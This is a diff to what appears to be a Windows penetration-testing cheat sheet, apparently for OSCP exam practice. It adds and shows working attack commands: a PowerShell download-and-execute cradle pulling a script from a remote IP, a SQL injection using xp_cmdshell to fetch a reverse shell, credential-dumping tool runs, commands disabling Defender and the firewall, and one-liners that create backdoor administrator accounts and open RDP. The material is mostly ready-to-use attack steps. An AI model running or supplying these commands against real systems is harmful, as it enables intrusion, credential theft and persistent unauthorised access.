@@ -128,6 +128,19 @@ Creating an alias with PowerShell.
 Set-Alias -Name exiftool -Value "C:\Users\Administrator\Desktop\exiftool-12.92_64\exiftool-12.92_64\exiftool.exe"
 ```
 
+Code execution with Powershell.
+
+```bash
+powershell -exec bypass iex (new-object net.webclient).downloadstring('http://192.168.x.y/run.txt')
+```
+
+Automated tools.
+
+```bash
+.\winpeas.exe searchall domain
+.\LaZagne.exe all
+```
+
 ```bash
 admin' UNION SELECT 1,2; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.163:8000/rev.ps1") | powershell -noprofile';--+
 
@@ -159,9 +172,34 @@ Start-Process -NoNewWindow .\shell443.exe
 Start-Process "$env:windir\system32\mstsc.exe" -ArgumentList "/v:ms01.oscp.exam"
 
 powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format HTML"
+```
 
+
+```bash
 # Create Another Admin for RDP
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
+#Enable Remote Desktop
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh firewall add portopening TCP 3389 "Remote Desktop"
+::netsh firewall set service remotedesktop enable #I found that this line is not needed
+::sc config TermService start= auto #I found that this line is not needed
+::net start Termservice #I found that this line is not needed
+
+#Enable Remote Desktop with wmic
+wmic rdtoggle where AllowTSConnections="0" call SetAllowTSConnections "1"
+##or
+wmic /node:remotehost path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"
+
+#Enable Remote assistance:
+reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fAllowToGetHelp /t REG_DWORD /d 1 /f
+netsh firewall set service remoteadmin enable
+
+#Ninja combo (New Admin User, RDP + Rassistance + Firewall allow)
+net user hacker Hacker123! /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable
+
 netsh advfirewall set allprofiles state off
 net user /add backdoor Password123!
 net localgroup administrators /add backdoor
